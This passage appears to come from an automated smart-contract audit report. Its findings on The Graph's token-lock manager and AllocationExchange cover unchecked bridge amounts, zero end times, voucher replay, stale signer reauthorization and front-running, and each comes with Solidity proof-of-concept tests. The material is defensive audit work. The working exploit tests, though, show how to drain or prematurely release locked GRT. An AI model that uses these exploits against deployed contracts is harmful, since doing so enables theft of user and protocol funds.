### Finding Status Justification: In the new-wallet branch, onTokenTransfer deploys and initializes the wallet using walletData.managedAmount, then transfers the full bridge _amount to the wallet. There is no require that _amount equals or is bounded by managedAmount. Since totalOutstandingAmount is based on managedAmount and surplusAmount is currentBalance minus outstanding, any _amount greater than managedAmount is immediately surplus. withdrawSurplus can be called by the beneficiary before endTime. The note about surplus being possible is not an explicit acceptance of overfunded locked bridge receipts bypassing the lock.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The creation branch initializes the L2 wallet with walletData.managedAmount but transfers the bridge receipt amount _amount without requiring _amount to equal, or at least not exceed, managedAmount. If _amount is greater than managedAmount, the new wallet's currentBalance exceeds totalOutstandingAmount immediately, and the beneficiary can withdraw the excess through withdrawSurplus before the vesting end. Vulnerable snippet: `_deployFromL1(... walletData); ... _token.safeTransfer(contractAddress, _amount);` with no `require(_amount <= walletData.managedAmount)` or accounting migration for the excess.

## Impact
A transferred locked wallet can receive more GRT than its locked liability and make the excess immediately withdrawable, bypassing the lock semantics for any overfunded amount in the initial L2 receipt.

## Proof of Concept
1. A bridge-authenticated transfer creates an L2 wallet with walletData.managedAmount = M but delivers _amount = M + X. 2. onTokenTransfer deploys and initializes the wallet with managedAmount M. 3. The manager transfers M + X tokens to the wallet. 4. totalOutstandingAmount is M while currentBalance is M + X, so surplusAmount is X. 5. The beneficiary calls withdrawSurplus(X) before endTime and receives locked bridged tokens early.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";

contract MockERC20 {
    string public name = "Mock GRT";
    string public symbol = "GRT";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

interface IWallet { function surplusAmount() external view returns (uint256); function withdrawSurplus(uint256) external; function totalOutstandingAmount() external view returns (uint256); }

contract L2GraphTokenLockManagerInitialSurplusTest is Test {
    MockERC20 token;
    L2GraphTokenLockWallet master;
    L2GraphTokenLockManager manager;
    address gateway = address(0x1000);
    address l1Tool = address(0x2000);
    address beneficiary = address(0xBEEF);
    address owner = address(0xCAFE);
    address l1Wallet = address(0xABCD);

    function setUp() public {
        token = new MockERC20();
        master = new L2GraphTokenLockWallet();
        manager = new L2GraphTokenLockManager(IERC20(address(token)), address(master), gateway, l1Tool);
        token.mint(address(manager), 2_000 ether);
    }

    function testInitialOverfundingCreatesWithdrawableSurplusBeforeEndTime() public {
        uint256 start = block.timestamp;
        uint256 end = block.timestamp + 365 days;
        L2GraphTokenLockManager.TransferredWalletData memory data = L2GraphTokenLockManager.TransferredWalletData({ l1Address: l1Wallet, owner: owner, beneficiary: beneficiary, managedAmount: 1_000 ether, startTime: start, endTime: end });

        vm.prank(gateway);
        manager.onTokenTransfer(l1Tool, 1_100 ether, abi.encode(data));
        address wallet = manager.l1WalletToL2Wallet(l1Wallet);

        assertEq(token.balanceOf(wallet), 1_100 ether);
        assertEq(IWallet(wallet).totalOutstandingAmount(), 1_000 ether);
        assertEq(IWallet(wallet).surplusAmount(), 100 ether);

        vm.prank(beneficiary);
        IWallet(wallet).withdrawSurplus(100 ether);
        assertEq(token.balanceOf(beneficiary), 100 ether);
        assertEq(token.balanceOf(wallet), 1_000 ether);
    }
}

## Suggested Mitigation
Require the receipt amount to match the locked accounting being initialized, e.g. `require(_amount == walletData.managedAmount, "AMOUNT_MISMATCH")`, or explicitly split excess into a separate non-locked authenticated path. If partial transfers are intended, initialize or increment managedAmount using the actual locked amount received so `currentBalance()` cannot exceed locked liabilities unintentionally.


## [H-130]. Malformed L1 wallet data can initialize an L2 lock with endTime zero and release all locked GRT immediately

## id: w8d_zw8BUDInxrq3a3Hak

## Derived From Pattern/Invariant
InitOrderOrUnintialized / MaturityorGatingByPass

## Exploit Type
AccountingInvariantViolation

## Location
L2GraphTokenLockManager.onTokenTransfer

## Finding Status: Valid
### Finding Status Justification: onTokenTransfer decodes walletData and deploys the L2 wallet without validating the schedule. initializeFromL1 then sets releaseStartTime to walletData.endTime and accepts endTime zero. With startTime zero and endTime zero, releasableAmount does not trigger the releaseStartTime guard, and availableAmount returns managedAmount because currentTime() > endTime. release can then transfer the managed balance immediately to the beneficiary. The base initializer would reject zero startTime and invalid ordering, but it is bypassed here and no equivalent L2-side validation is present.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L2GraphTokenLockManager decodes bridge-supplied wallet data and deploys an L2GraphTokenLockWallet without validating the base lock invariants. The deployed wallet's initializeFromL1 bypasses GraphTokenLock._initialize and directly writes schedule fields. Vulnerable snippet: `TransferredWalletData memory walletData = abi.decode(_data, (TransferredWalletData)); ... _deployFromL1(keccak256(_data), walletData); ... _token.safeTransfer(contractAddress, _amount);` and in the wallet: `releaseStartTime = _walletData.endTime; periods = 1; isAccepted = true; revocable = Revocability.Disabled;`. If endTime is zero, releaseStartTime is also zero, so GraphTokenLock.releasableAmount skips the release-start guard and availableAmount returns managedAmount because currentTime() > endTime. The beneficiary can call release immediately even though transferred L1 wallets are intended to be unreleasable on L2 until the original vesting end.

## Impact
A transferred locked wallet can have 100% of its bridged GRT released immediately on L2, bypassing the lock schedule and causing premature loss of locked protocol/user funds from the token-lock contract.

## Proof of Concept
1. Attacker initiates or causes a normal authenticated L1-to-L2 wallet transfer whose encoded TransferredWalletData has endTime = 0 and startTime = 0. 2. The L2 gateway calls onTokenTransfer from the configured L1 transfer tool. 3. The manager deploys the L2 wallet and initializeFromL1 accepts the malformed schedule. 4. The manager transfers the bridged GRT to the wallet. 5. The attacker, as beneficiary, immediately calls release. 6. Because releaseStartTime is zero and currentTime() > endTime, releasableAmount equals managedAmount and the full locked balance is transferred before any intended maturity.

## Proof of Code
pragma solidity ^0.7.3;
pragma experimental ABIEncoderV2;
import "../contracts/L2GraphTokenLockManager.sol";
import "../contracts/L2GraphTokenLockWallet.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
interface Vm { function prank(address) external; }
contract MockGRT is IERC20 { mapping(address=>uint256) public override balanceOf; mapping(address=>mapping(address=>uint256)) public override allowance; uint256 public override totalSupply; function mint(address to,uint256 a) external { balanceOf[to]+=a; totalSupply+=a; } function transfer(address to,uint256 a) external override returns(bool){ require(balanceOf[msg.sender]>=a); balanceOf[msg.sender]-=a; balanceOf[to]+=a; return true; } function approve(address s,uint256 a) external override returns(bool){ allowance[msg.sender][s]=a; return true; } function transferFrom(address f,address t,uint256 a) external override returns(bool){ require(balanceOf[f]>=a); require(allowance[f][msg.sender]>=a); allowance[f][msg.sender]-=a; balanceOf[f]-=a; balanceOf[t]+=a; return true; } }
contract L2ImmediateReleasePoC { Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code"))))); function assertEq(uint256 a,uint256 b) internal { require(a==b); } function testMalformedEndTimeZeroReleasesImmediately() public { address gateway=address(0x100); address tool=address(0x200); address attacker=address(0x300); address l1Wallet=address(0x400); MockGRT token=new MockGRT(); L2GraphTokenLockWallet master=new L2GraphTokenLockWallet(); L2GraphTokenLockManager manager=new L2GraphTokenLockManager(IERC20(address(token)),address(master),gateway,tool); uint256 amount=1000000 ether; token.mint(address(manager),amount); L2GraphTokenLockManager.TransferredWalletData memory d=L2GraphTokenLockManager.TransferredWalletData({l1Address:l1Wallet,owner:attacker,beneficiary:attacker,managedAmount:amount,startTime:0,endTime:0}); vm.prank(gateway); manager.onTokenTransfer(tool,amount,abi.encode(d)); address l2Wallet=manager.l1WalletToL2Wallet(l1Wallet); assertEq(token.balanceOf(attacker),0); vm.prank(attacker); L2GraphTokenLockWallet(l2Wallet).release(); assertEq(token.balanceOf(attacker),amount); } }

## Suggested Mitigation
Validate TransferredWalletData before deployment using the same constraints as GraphTokenLock._initialize: owner != 0, beneficiary != 0, managedAmount > 0, startTime != 0, startTime < endTime, and endTime must be in the future for transferred locks. Prefer calling a shared internal validation routine before _deployFromL1 and inside initializeFromL1.


## [H-131]. First bridge receipt can create immediately withdrawable surplus when amount exceeds managedAmount

## id: DM2-8G7j0aYaT8tU_ynnC

## Derived From Pattern/Invariant
ConfigFootgun

## Exploit Type
AccountingInvariantViolation

## Location
L2GraphTokenLockManager.onTokenTransfer

## Finding Status: Valid
### Finding Status Justification: The first-receipt path initializes the wallet accounting from walletData.managedAmount but transfers _amount to the wallet. The code contains no require(_amount == walletData.managedAmount) or require(_amount <= walletData.managedAmount). If _amount exceeds managedAmount, currentBalance exceeds totalOutstandingAmount immediately, and GraphTokenLock.withdrawSurplus allows the beneficiary to withdraw the difference regardless of endTime. Gateway and transfer-tool sender checks do not validate this amount/accounting relationship, so they are not complete safeguards for the claimed issue.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
The new-wallet branch never checks that the bridged token `_amount` matches `walletData.managedAmount`. It initializes the L2 lock wallet with `managedAmount` from `_data`, then transfers the full `_amount` to the wallet. If `_amount > walletData.managedAmount`, the excess is immediately classified as surplus by `GraphTokenLock.surplusAmount()` and can be withdrawn by the beneficiary even when `endTime` is still in the future.

Vulnerable snippet:
`(bytes32 initHash, address contractAddress) = _deployFromL1(keccak256(_data), walletData);`
`_token.safeTransfer(contractAddress, _amount);`

There is no `require(_amount == walletData.managedAmount)` or `require(_amount <= walletData.managedAmount)`.

## Impact
An authenticated bridge message whose amount is larger than the encoded locked liability lets the beneficiary withdraw the difference immediately, bypassing the intended L2 lock until `endTime`. This can prematurely release or steal locked GRT from a newly created transferred wallet.

## Proof of Concept
1. A bridge receipt reaches `L2GraphTokenLockManager` for a new `l1Address`.
2. The encoded wallet data sets `managedAmount = M` and a future `endTime`, but the token receipt amount is `A`, where `A > M`.
3. The manager deploys and initializes the L2 wallet with `managedAmount = M`.
4. The manager transfers `A` GRT to the wallet.
5. The wallet reports `surplusAmount() = A - M`.
6. The beneficiary calls `withdrawSurplus(A - M)` before vesting ends.

## Proof of Code
pragma solidity ^0.7.3;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../contracts/L2GraphTokenLockManager.sol";
import "../contracts/L2GraphTokenLockWallet.sol";

contract MockERC20 is IERC20 {
    string public name = "Mock GRT";
    string public symbol = "GRT";
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external override returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract L2InitialSurplusPoC is Test {
    MockERC20 token;
    L2GraphTokenLockWallet master;
    L2GraphTokenLockManager manager;
    address gateway = address(0x1000);
    address l1Tool = address(0x2000);
    address owner = address(0x3000);
    address beneficiary = address(0x4000);
    address l1Wallet = address(0x5000);

    function setUp() public {
        token = new MockERC20();
        master = new L2GraphTokenLockWallet();
        manager = new L2GraphTokenLockManager(IERC20(address(token)), address(master), gateway, l1Tool);
        token.mint(address(manager), 2_000 ether);
    }

    function testInitialAmountAboveManagedAmountCreatesWithdrawableSurplus() public {
        L2GraphTokenLockManager.TransferredWalletData memory data = L2GraphTokenLockManager.TransferredWalletData({
            l1Address: l1Wallet,
            owner: owner,
            beneficiary: beneficiary,
            managedAmount: 1_000 ether,
            startTime: block.timestamp,
            endTime: block.timestamp + 365 days
        });

        vm.prank(gateway);
        manager.onTokenTransfer(l1Tool, 1_100 ether, abi.encode(data));
        address l2Wallet = manager.l1WalletToL2Wallet(l1Wallet);

        assertEq(token.balanceOf(l2Wallet), 1_100 ether);
        assertEq(L2GraphTokenLockWallet(l2Wallet).totalOutstandingAmount(), 1_000 ether);
        assertEq(L2GraphTokenLockWallet(l2Wallet).surplusAmount(), 100 ether);

        vm.prank(beneficiary);
        L2GraphTokenLockWallet(l2Wallet).withdrawSurplus(100 ether);
        assertEq(token.balanceOf(beneficiary), 100 ether);
    }
}

## Suggested Mitigation
Validate the bridge receipt against the encoded lock accounting before deployment. Require `_amount == walletData.managedAmount` for the initial creation path, or explicitly encode and authenticate separate locked and surplus amounts and initialize wallet liabilities to match the transferred locked amount.


## [H-132]. AllocationExchange vouchers can be replayed across exchange deployments because signatures omit domain separation

## id: ILknBlfB8zW9j7GVsOuTE

## Derived From Pattern/Invariant
ReplayAcrossForksOrL2s / PermitOrSignatureReplay: voucher signatures are not bound to contract address, chain id, or domain

## Exploit Type
SignatureReplay

## Location
AllocationExchange._redeem

## Finding Status: Valid
### Finding Status Justification: 
### Finding Complexity: 2
## Minimim Privilege Required:Permissionless


## Description
AllocationExchange treats a voucher signature as valid if it recovers to any currently authorized authority, but the signed payload contains only allocationID and amount. It omits address(this), block.chainid, the staking/token addresses, a nonce, and an expiry. As a result, the same authority signature is valid in every AllocationExchange instance or domain where that signer is authorized and allocationsRedeemed[allocationID] is still false. Vulnerable snippet: `bytes32 messageHash = keccak256(abi.encodePacked(_voucher.allocationID, _voucher.amount)); address voucherSigner = ECDSA.recover(messageHash, _voucher.signature); require(authority[voucherSigner], "Exchange: invalid signer"); ... allocationsRedeemed[_voucher.allocationID] = true; STAKING.collect(_voucher.amount, _voucher.allocationID);`. The replay guard is local to one contract instance, so it does not stop replay against another funded instance, replacement deployment, fork, or sibling domain that shares the same authority.

## Impact
A party holding a valid voucher for one intended AllocationExchange can redeem the same signed authorization against another funded exchange instance/domain that uses the same authority, causing unintended GRT to be pulled from that contract into Staking.collect for the attacker's chosen allocationID. If the unintended exchange holds significant GRT, this can directly drain protocol-held funds beyond the authority's intended domain authorization.

## Proof of Concept
1. Governance deploys or operates two AllocationExchange instances, A and B, with the same authorized signer, or a replacement/cross-domain instance reuses the same authority. 2. Both instances hold GRT and have approved the same or corresponding staking contract. 3. The authority signs a voucher intended only for A over keccak256(abi.encodePacked(allocationID, amount)). 4. The attacker obtains the voucher and calls redeem(voucher) on A, marking only A.allocationsRedeemed[allocationID]. 5. The attacker then calls redeem(voucher) on B. Because B recomputes the same hash, recovers the same authority, and has an independent allocationsRedeemed mapping, the redemption succeeds again. 6. B's GRT balance is reduced by amount even though the authority never signed a B-specific authorization.

## Proof of Code
pragma solidity ^0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/cryptography/ECDSA.sol";

interface IGraphTokenLike { function approve(address,uint256) external returns (bool); function transfer(address,uint256) external returns (bool); function transferFrom(address,address,uint256) external returns (bool); function mint(address,uint256) external; function balanceOf(address) external view returns (uint256); }
interface IStakingLike { function collect(uint256 amount, address allocationID) external; }

contract MockGRT is IGraphTokenLike {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external override { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external override returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract MockStaking is IStakingLike {
    IGraphTokenLike public token;
    mapping(address => uint256) public collected;
    constructor(IGraphTokenLike t) { token = t; }
    function collect(uint256 amount, address allocationID) external override { require(token.transferFrom(msg.sender, address(this), amount), "pull failed"); collected[allocationID] += amount; }
}

contract AllocationExchangeReplayTest is Test {
    using ECDSA for bytes32;

    function testSameVoucherReplaysAcrossTwoExchangeInstances() public {
        uint256 authorityPk = 0xA11CE;
        address authority = vm.addr(authorityPk);
        address governor = address(0xBEEF);
        address allocationID = address(0x1234);
        uint256 amount = 1_000_000 ether;

        MockGRT grt = new MockGRT();
        MockStaking staking = new MockStaking(IGraphTokenLike(address(grt)));
        AllocationExchange exA = new AllocationExchange(IGraphTokenLike(address(grt)), IStakingLike(address(staking)), governor, authority);
        AllocationExchange exB = new AllocationExchange(IGraphTokenLike(address(grt)), IStakingLike(address(staking)), governor, authority);

        grt.mint(address(exA), amount);
        grt.mint(address(exB), amount);
        exA.approveAll();
        exB.approveAll();

        bytes32 digest = keccak256(abi.encodePacked(allocationID, amount));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(authorityPk, digest);
        bytes memory sig = abi.encodePacked(r, s, v);
        AllocationExchange.AllocationVoucher memory voucher = AllocationExchange.AllocationVoucher({allocationID: allocationID, amount: amount, signature: sig});

        exA.redeem(voucher);
        assertEq(grt.balanceOf(address(exA)), 0);
        assertEq(grt.balanceOf(address(exB)), amount);

        exB.redeem(voucher);
        assertEq(grt.balanceOf(address(exB)), 0);
        assertEq(staking.collected(allocationID), 2 * amount);
    }
}

## Suggested Mitigation
Use EIP-712 typed data or at least EIP-191 with explicit domain binding. The signed struct should include address(this), block.chainid, GRAPH_TOKEN, STAKING, allocationID, amount, a per-signer or per-allocation nonce, and a deadline. Consume the nonce on redemption and keep allocationsRedeemed as an additional allocation-level guard.


## [H-133]. Reauthorized signers resurrect stale vouchers because vouchers have no expiry or signer epoch

## id: x_vOtbCGV6Wcmp18hRMQd

## Derived From Pattern/Invariant
PermitOrSignatureReplay / PermitDeadlineBypass

## Exploit Type
SignatureReplay

## Location
AllocationExchange._redeem

## Finding Status: Valid
### Finding Status Justification: AllocationExchange.setAuthority can toggle authority status, and _redeem validates only authority[voucherSigner] at redemption time. The signed message includes only allocationID and amount, with no deadline, issued-at time, nonce, revocation epoch, or signer epoch. Therefore an old unredeemed voucher from an address becomes valid whenever that same address is authorized again, provided the allocationID has not already been redeemed. The only replay guard, allocationsRedeemed, is per allocationID and does not invalidate stale signatures globally. There is no complete safeguard for revocation-window invalidation. The behavior is in the in-scope AllocationExchange production contract and is not explicitly documented as an accepted stale-liability risk. The attacker's redemption is permissionless and does not require the attacker to hold a privileged role or compromised key; reauthorization is a normal governance configuration precondition, not the exploit action itself.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Revoking an authority only blocks signatures while authority[signer] is false. Previously signed, unredeemed vouchers are not expired and are not tied to a signer revocation epoch, so if governance later reauthorizes the same EOA, every old signature from that EOA becomes valid again. Vulnerable snippet: require(authority[voucherSigner], "Exchange: invalid signer"); with messageHash = keccak256(abi.encodePacked(_voucher.allocationID, _voucher.amount)); no deadline, nonce, issuedAt, or authority epoch is checked.

## Impact
A holder of old vouchers can redeem them after the signer is reenabled, causing current AllocationExchange funds to be collected for stale liabilities that governance may have intended to invalidate during the revocation window.

## Proof of Concept
1. An authorized signer signs a voucher. 2. The signer is later revoked, so redeeming the voucher correctly reverts. 3. Governance later reauthorizes the same signer address for new operations. 4. A stale voucher holder submits the old signature. 5. The old voucher succeeds because authorization is checked only against the current boolean signer status.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";
import "../contracts/payments/AllocationExchange.sol";
import "@graphprotocol/interfaces/contracts/contracts/token/IGraphToken.sol";
import "@graphprotocol/interfaces/contracts/contracts/staking/IStaking.sol";

contract MockGRT is IGraphToken {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external override returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract MockStaking is IStaking {
    MockGRT public token;
    constructor(MockGRT t) { token = t; }
    function collect(uint256 amount, address allocationID) external override { require(token.transferFrom(msg.sender, allocationID, amount), "pull failed"); }
}

contract AllocationExchangeStaleVoucherTest is Test {
    function testOldVoucherWorksAgainAfterSignerReauthorization() external {
        uint256 authorityPk = 0xA11CE;
        address authority = vm.addr(authorityPk);
        address governor = address(0xBEEF);
        address allocation = address(0xA770C);
        address attacker = address(0xBAD);
        uint256 amount = 1_000_000 ether;

        MockGRT grt = new MockGRT();
        MockStaking staking = new MockStaking(grt);
        AllocationExchange exchange = new AllocationExchange(IGraphToken(address(grt)), IStaking(address(staking)), governor, authority);
        grt.mint(address(exchange), amount);
        exchange.approveAll();

        bytes32 digest = keccak256(abi.encodePacked(allocation, amount));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(authorityPk, digest);
        bytes memory oldSig = abi.encodePacked(r, s, v);
        AllocationExchange.AllocationVoucher memory voucher = AllocationExchange.AllocationVoucher(allocation, amount, oldSig);

        vm.prank(governor);
        exchange.setAuthority(authority, false);
        vm.prank(attacker);
        vm.expectRevert("Exchange: invalid signer");
        exchange.redeem(voucher);

        vm.prank(governor);
        exchange.setAuthority(authority, true);
        vm.prank(attacker);
        exchange.redeem(voucher);

        assertEq(grt.balanceOf(allocation), amount);
        assertTrue(exchange.allocationsRedeemed(allocation));
    }
}

## Suggested Mitigation
Add a deadline and a per-signer nonce or revocation epoch to the signed voucher. Increment the signer epoch whenever authority is revoked or rotated, and require the signed epoch to equal the current epoch. Store consumed voucher hashes or nonces rather than relying only on allocationID.


## [M-134]. AllocationExchange rejects documented Ethereum signed vouchers and accepts raw digests instead

## id: nCwpdPsUcY2UVXUMAyKMh

## Derived From Pattern/Invariant
StandardViolation / documented Ethereum signed message mismatch

## Exploit Type
StandardViolation

## Location
AllocationExchange._redeem

## Finding Status: Valid
### Finding Status Justification: The code comments for redeem, redeemMany, and _redeem state that each voucher must be signed using an Ethereum signed message. However, _redeem computes keccak256(abi.encodePacked(allocationID, amount)) and passes that raw digest directly to ECDSA.recover. It never applies the EIP-191 Ethereum signed message prefix before recovery. Thus a standard personal_sign/Ethereum-signed-message signature over that digest will recover a different signer and fail authority[voucherSigner], while a raw digest signature can pass. No complete safeguard or alternate documented code path handles the prefixed format. The affected code is AllocationExchange, an in-scope production file. This is a present code/docs mismatch, not future speculation. It does not require a privileged or compromised actor to trigger rejection; a redeemer submitting a voucher produced according to the contract’s own documented format hits the fault, so it is not solely arbitrary user misuse.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The contract comments state that vouchers must be signed using an Ethereum signed message, but the implementation recovers the signer directly from the raw keccak256 digest. Vulnerable snippet: `bytes32 messageHash = keccak256(abi.encodePacked(_voucher.allocationID, _voucher.amount)); address voucherSigner = ECDSA.recover(messageHash, _voucher.signature);`. A signer following the documented EIP-191/personal_sign flow signs `toEthSignedMessageHash(messageHash)`, which recovers to a different address and is rejected. Conversely, raw digest signatures are accepted despite not matching the documented signing domain.

## Impact
Authorized vouchers produced by standard Ethereum signed message tooling can become unredeemable, blocking intended allocation collection until the authority re-signs using the undocumented raw digest format. This is primarily a functional payment-settlement DoS and signature-domain footgun rather than direct theft.

## Proof of Concept
1. The authorized authority follows the contract notice and signs the Ethereum signed message for keccak256(allocationID, amount). 2. A redeemer submits that voucher to redeem. 3. _redeem recovers against the unprefixed digest instead of the EIP-191 digest. 4. The recovered signer is not the authorized authority, so redeem reverts with `Exchange: invalid signer`. 5. A raw digest signature from the same authority succeeds, proving the implementation contradicts the documented signing method.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";
import "../contracts/payments/AllocationExchange.sol";
import "@openzeppelin/contracts/cryptography/ECDSA.sol";

contract MockToken2 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract MockStaking2 {
    MockToken2 public token;
    uint256 public collected;
    constructor(MockToken2 t) { token = t; }
    function collect(uint256 amount, address) external { require(token.transferFrom(msg.sender, address(this), amount), "transferFrom"); collected += amount; }
}

contract AllocationExchangeEthSignMismatchTest is Test {
    using ECDSA for bytes32;

    function testDocumentedEthSignedVoucherIsRejectedButRawDigestWorks() external {
        uint256 authorityPk = 0xA11CE;
        address authority = vm.addr(authorityPk);
        address governor = address(0xBEEF);
        address allocationID = address(0xCAFE);
        uint256 amount = 100 ether;

        MockToken2 token = new MockToken2();
        MockStaking2 staking = new MockStaking2(token);
        AllocationExchange exchange = new AllocationExchange(IGraphToken(address(token)), IStaking(address(staking)), governor, authority);
        token.mint(address(exchange), amount * 2);
        exchange.approveAll();

        bytes32 rawDigest = keccak256(abi.encodePacked(allocationID, amount));
        bytes32 ethDigest = rawDigest.toEthSignedMessageHash();
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(authorityPk, ethDigest);
        bytes memory ethSig = abi.encodePacked(r1, s1, v1);
        AllocationExchange.AllocationVoucher memory ethVoucher = AllocationExchange.AllocationVoucher(allocationID, amount, ethSig);

        vm.expectRevert("Exchange: invalid signer");
        exchange.redeem(ethVoucher);

        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(authorityPk, rawDigest);
        bytes memory rawSig = abi.encodePacked(r2, s2, v2);
        AllocationExchange.AllocationVoucher memory rawVoucher = AllocationExchange.AllocationVoucher(allocationID, amount, rawSig);
        exchange.redeem(rawVoucher);

        assertEq(staking.collected(), amount);
        assertEq(exchange.allocationsRedeemed(allocationID), true);
    }
}

## Suggested Mitigation
Either update the implementation to recover `ECDSA.toEthSignedMessageHash(messageHash)` if EIP-191 signatures are the intended format, or update the specification and signing infrastructure to explicitly require EIP-712 typed data. Prefer EIP-712 with domain separation and deadlines.


## [H-135]. Bearer vouchers can be frontrun because AllocationExchange does not bind redemptions to the intended caller

## id: ByclhPFtjt77sfRBpEU6l

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
FrontrunMev

## Location
AllocationExchange._redeem

## Finding Status: Valid
### Finding Status Justification: redeem and redeemMany are external and permissionless, and _redeem authenticates only allocationID and amount signed by an authorized authority. There is no check that msg.sender is an intended redeemer, relayer, allocation controller, or recipient. Once any caller submits a valid voucher, allocationsRedeemed[allocationID] is set and later attempts for that allocation revert. This exactly supports the described mempool-copy/front-run path. No complete safeguard such as caller binding, nonce, deadline, commit-reveal, or private settlement exists in the shown code. AllocationExchange is in the audit scope. Although the notice says anyone with a signed voucher can redeem, it does not explicitly accept the front-running/impersonation and one-time consumption risk. The exploit path is currently available to any public caller observing a voucher and does not require privileged access, compromised credentials, or mere victim misuse without a protocol fault.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Any address can redeem any valid voucher. The signed payload contains only allocationID and amount, and _redeem does not check msg.sender, an intended recipient, or a relayer field. Vulnerable snippet: bytes32 messageHash = keccak256(abi.encodePacked(_voucher.allocationID, _voucher.amount)); ... require(authority[voucherSigner], "Exchange: invalid signer"); allocationsRedeemed[_voucher.allocationID] = true; STAKING.collect(_voucher.amount, _voucher.allocationID);. A mempool observer can copy a pending voucher redemption and submit the identical voucher first. The original redeemer then reverts on allocationsRedeemed[allocationID].

## Impact
The attacker can consume the one-time redemption for an allocationID before the intended redeemer or relayer, causing unwanted allocation collection and denial of the intended settlement path. Where allocation collection credits the allocation controller or affects protocol payment accounting, this impersonates the authorized redeemer flow and can redirect or prematurely trigger GRT settlement effects.

## Proof of Concept
1. An intended redeemer submits redeem(voucher) or redeemMany(vouchers) with a valid authority signature. 2. A mempool searcher copies the voucher calldata because the voucher is not caller-bound. 3. The searcher submits redeem(voucher) with higher priority. 4. AllocationExchange accepts the copied voucher, marks allocationsRedeemed[allocationID] true, and calls STAKING.collect. 5. The original transaction reverts as already redeemed, and in redeemMany a single copied allocationID can revert the whole batch.

## Proof of Code
pragma solidity ^0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";
import "../contracts/payments/AllocationExchange.sol";

contract MockGraphToken2 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
